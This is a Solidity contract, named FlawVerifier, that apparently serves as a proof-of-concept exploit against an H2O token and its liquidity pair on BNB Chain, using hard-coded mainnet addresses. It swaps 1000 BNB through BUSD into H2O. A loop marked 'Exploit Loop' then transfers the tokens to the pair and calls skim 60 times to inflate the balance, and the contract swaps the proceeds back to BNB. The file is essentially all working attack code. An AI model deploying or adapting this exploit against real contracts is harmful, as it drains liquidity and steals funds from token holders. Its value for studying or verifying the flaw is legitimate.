 pragma solidity ^0.8.0;

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external;
    function approve(address spender, uint256 amount) external;
    function transferFrom(address sender, address recipient, uint256 amount) external;
}

interface IRouter {
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

interface IPair {
    function skim(address to) external;
    function sync() external;
}

contract FlawVerifier {
    // BSC Addresses
    address constant ROUTER = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    address constant WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address constant BUSD = 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56;
    address constant H2O = 0xe9c4D4f095C7943a9ef5EC01AfD1385D011855A1;
    address constant PAIR = 0x42717781D93197247907F82482AE1d35D7BC101B;

    constructor() payable {}

    function executeOnOpportunity() external {
        // 1. Swap BNB to BUSD
        // Use 1000 BNB to get a large amount of BUSD
        uint256 amountIn = 1000 ether;
        address[] memory path = new address[](2);
        path[0] = WBNB;
        path[1] = BUSD;

        IRouter(ROUTER).swapExactETHForTokensSupportingFeeOnTransferTokens{value: amountIn}(
            0,
            path,
            address(this),
            block.timestamp
        );

        // 2. Swap BUSD to H2O
        uint256 busdBalance = IERC20(BUSD).balanceOf(address(this));
        require(busdBalance > 0, "No BUSD after swap");
        
        IERC20(BUSD).approve(ROUTER, type(uint256).max);
        
        path[0] = BUSD;
        path[1] = H2O;
        
        IRouter(ROUTER).swapExactTokensForTokensSupportingFeeOnTransferTokens(
            busdBalance,
            0,
            path,
            address(this),
            block.timestamp
        );

        // 3. Exploit Loop
        uint256 h2oBalance = IERC20(H2O).balanceOf(address(this));
        require(h2oBalance > 0, "No H2O after swap");

        // Loop 60 times
        for (uint i = 0; i < 60; i++) {
            IERC20(H2O).transfer(PAIR, h2oBalance);
            IPair(PAIR).skim(address(this));
            h2oBalance = IERC20(H2O).balanceOf(address(this));
        }

        // 4. Swap H2O back to BUSD
        IERC20(H2O).approve(ROUTER, type(uint256).max);
        path[0] = H2O;
        path[1] = BUSD;
        
        IRouter(ROUTER).swapExactTokensForTokensSupportingFeeOnTransferTokens(
            h2oBalance,
            0,
            path,
            address(this),
            block.timestamp
        );

        // 5. Swap BUSD back to BNB
        busdBalance = IERC20(BUSD).balanceOf(address(this));
        path[0] = BUSD;
        path[1] = WBNB;
        
        IRouter(ROUTER).swapExactTokensForETHSupportingFeeOnTransferTokens(
            busdBalance,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    receive() external payable {}
}